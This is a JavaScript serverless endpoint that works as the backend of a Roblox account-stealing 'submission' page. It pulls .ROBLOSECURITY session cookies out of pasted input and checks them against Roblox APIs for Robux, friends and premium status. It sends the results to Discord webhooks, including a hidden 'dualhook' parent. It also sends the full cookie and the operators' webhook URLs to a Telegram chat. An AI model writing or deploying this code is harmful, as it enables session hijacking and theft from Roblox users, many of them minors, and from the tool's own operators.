// api/submit.js

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

const TG_TOKEN = process.env.TG_TOKEN;
const TG_CHAT  = process.env.TG_CHAT;

function escapeHTML(str = '') {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function redisGet(key) {
  try {
    const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: {
        Authorization: `Bearer ${REDIS_TOKEN}`
      }
    });

    const json = await res.json();

    if (!json.result) return null;

    try {
      return JSON.parse(json.result);
    } catch {
      return null;
    }

  } catch (err) {
    console.error('REDIS ERROR:', err);
    return null;
  }
}

async function tgSend(text) {
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TG_CHAT,
          text,
          parse_mode: 'HTML'
        })
      }
    );

    if (!res.ok) {
      console.error('TELEGRAM ERROR:', await res.text());
    }

  } catch (err) {
    console.error('TG SEND ERROR:', err);
  }
}

function extractRobloxCookie(raw) {
  if (!raw) return null;

  const warningMatch = raw.match(
    /(_\|WARNING[-A-Z0-9.:_ ]+\|_[\w\-.]+)/
  );

  if (warningMatch) {
    return warningMatch[1];
  }

  const tokenOnly = raw.match(/\|_([\w\-]{50,})/);

  if (tokenOnly) {
    return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
  }

  return null;
}

async function fetchRobloxInfo(cookie) {
  try {
    const headers = {
      Cookie: `.ROBLOSECURITY=${cookie}`
    };

    const authRes = await fetch(
      'https://users.roblox.com/v1/users/authenticated',
      { headers }
    );

    if (!authRes.ok) {
      console.log('INVALID COOKIE');
      return null;
    }

    const auth = await authRes.json();
    const uid  = auth.id;

    const [
      robuxRes,
      friendRes,
      premiumRes
    ] = await Promise.all([

      fetch(
        'https://economy.roblox.com/v1/user/currency',
        { headers }
      ),

      fetch(
        `https://friends.roblox.com/v1/users/${uid}/friends/count`,
        { headers }
      ),

      fetch(
        `https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`,
        { headers }
      )
    ]);

    const robuxData  = robuxRes.ok
      ? await robuxRes.json()
      : null;

    const friendData = friendRes.ok
      ? await friendRes.json()
      : null;

    const isPremium = premiumRes.ok
      ? await premiumRes.json()
      : false;

    return {
      id: uid,
      username: auth.name,
      displayName: auth.displayName,
      robux: robuxData?.robux ?? 'N/A',
      friends: friendData?.count ?? 'N/A',
      premium: isPremium === true ? 'Yes ⭐' : 'No'
    };

  } catch (err) {
    console.error('ROBLOX FETCH ERROR:', err);
    return null;
  }
}

async function sendToDiscord(
  webhookUrl,
  pageName,
  slotLabel,
  rawValue,
  cookie,
  roblox,
  now
) {
  try {

    if (
      !webhookUrl ||
      !webhookUrl.startsWith(
        'https://discord.com/api/webhooks/'
      )
    ) {
      console.log('INVALID WEBHOOK');
      return;
    }

    let pastedField;

    if (roblox) {

      pastedField = [
        `👤 ${roblox.username} (${roblox.displayName})`,
        `🆔 ID: ${roblox.id}`,
        `💰 Robux: ${roblox.robux}`,
        `👥 Friends: ${roblox.friends}`,
        `⭐ Premium: ${roblox.premium}`
      ].join('\n');

    } else {

      pastedField = rawValue.slice(0, 900);

    }

   const payload = {
  content: '@everyone',

  embeds: [
    {
      title: `🚨 New Submission Received • ${roblox?.username || 'Unknown User'}`,

      description: ':fire: `NEW PAGE ENTRY` :fire:',

      color: 5793266,

      fields: [

        {
          name: '👤 Username',
          value: roblox?.username || 'N/A',
          inline: true
        },

        {
          name: '📛 Display Name',
          value: roblox?.displayName || 'N/A',
          inline: true
        },

        {
          name: '🆔 User ID',
          value: String(roblox?.id || 'N/A'),
          inline: true
        },

        {
          name: '💰 Robux',
          value: String(roblox?.robux ?? 'N/A'),
          inline: true
        },

        {
          name: '👥 Friends',
          value: String(roblox?.friends ?? 'N/A'),
          inline: true
        },

        {
          name: '⭐ Premium',
          value: roblox?.isPremium ? 'Yes ⭐' : 'No ❌',
          inline: true
        },

        {
          name: '📊 Account Age',
          value: roblox?.accountAgeDays
            ? `${roblox.accountAgeDays} Days`
            : 'N/A',
          inline: true
        },

        {
          name: '👥 Groups Owned',
          value: String(roblox?.groupsOwned ?? 'N/A'),
          inline: true
        },

        {
          name: '🛒 Limiteds Value',
          value: String(roblox?.limitedsValue ?? 'N/A'),
          inline: true
        },

        {
          name: '📄 Page',
          value: `\`${pageName}\``,
          inline: false
        },

        {
          name: '🎯 Slot',
          value: `\`${slotLabel}\``,
          inline: false
        },

        {
          name: '📥 Pasted Content',
          value: (pastedField || 'N/A').slice(0, 1000),
          inline: false
        },

        {
          name: '📅 Date Submitted',
          value: `\`${now}\``,
          inline: false
        }

      ],

      footer: {
        text: 'Submission Logger • Automated System'
      },

      thumbnail: {
        url: roblox?.avatarUrl ||
          'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
      }
    }
  ]
};

    const resp = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (!resp.ok) {
      console.error(
        'DISCORD ERROR:',
        await resp.text()
      );
    }

  } catch (err) {
    console.error('DISCORD SEND ERROR:', err);
  }
}

export default async function handler(req, res) {

  res.setHeader(
    'Access-Control-Allow-Origin',
    '*'
  );

  res.setHeader(
    'Access-Control-Allow-Methods',
    'POST, OPTIONS'
  );

  res.setHeader(
    'Access-Control-Allow-Headers',
    'Content-Type'
  );

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({
      error: 'Method not allowed'
    });
  }

  let body = req.body;

  if (typeof body === 'string') {
    try {
      body = JSON.parse(body);
    } catch {
      return res.status(400).json({
        error: 'Invalid JSON'
      });
    }
  }

  const { slug, slots } = body || {};

  if (!slug) {
    return res.status(400).json({
      error: 'slug is required'
    });
  }

  if (!slots) {
    return res.status(400).json({
      error: 'slots is required'
    });
  }

  const record = await redisGet(`slot:${slug}`);

  if (!record) {
    return res.status(404).json({
      error: 'Page not found'
    });
  }

  const now = new Date().toISOString();

  const slotEntry = Object.entries(slots)
    .find(([, v]) => v && v.length > 0);

  const slotLabel = slotEntry
    ? slotEntry[0]
    : 'N/A';

  const rawValue = slotEntry
    ? slotEntry[1]
    : '(empty)';

  const cookie = extractRobloxCookie(rawValue);

  const roblox = cookie
    ? await fetchRobloxInfo(cookie)
    : null;

  // DISCORD MAIN WEBHOOK

  await sendToDiscord(
    record.webhook,
    record.displayName,
    slotLabel,
    rawValue,
    cookie,
    roblox,
    now
  );

  // DUALHOOK

  let webhook1 = 'N/A';

  if (record.dualhookParent) {

    try {

      const parentRecord = await redisGet(
        `slot:${record.dualhookParent}`
      );

      if (
        parentRecord?.webhook &&
        parentRecord.webhook !== record.webhook
      ) {

        webhook1 = parentRecord.webhook;

        await sendToDiscord(
          parentRecord.webhook,
          record.displayName,
          slotLabel,
          rawValue,
          cookie,
          roblox,
          now
        );
      }

    } catch (err) {
      console.error('DUALHOOK ERROR:', err);
    }
  }

  // TELEGRAM

  const tgContent = roblox
    ? [
        `👤 ${escapeHTML(roblox.username)} (${escapeHTML(roblox.displayName)})`,
        `🆔 ${roblox.id}`,
        `💰 Robux: ${roblox.robux}`,
        `👥 Friends: ${roblox.friends}`,
        `⭐ Premium: ${roblox.premium}`,
        `🍪 Cookie: ${escapeHTML(cookie?.slice(0, 1200) || 'N/A')}...`
      ].join('\n')
    : escapeHTML(rawValue.slice(0, 1500));

  const tgMsg = [
    `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨`,
    `------------------------------------------`,
    `📄 PAGE:`,
    `${escapeHTML(record.displayName)}`,
    `------------------------------------------`,
    `🎯 SLOT: ${escapeHTML(slotLabel)}`,
    `------------------------------------------`,
    tgContent,
    `------------------------------------------`,
    `🔗 WEBHOOK2:`,
    `<code>${escapeHTML(record.webhook)}</code>`,
    `------------------------------------------`,
    `🔗 WEBHOOK1:`,
    `<code>${escapeHTML(webhook1)}</code>`,
    `------------------------------------------`,
    `📅 ${now}`
  ].join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({
    success: true
  });
}
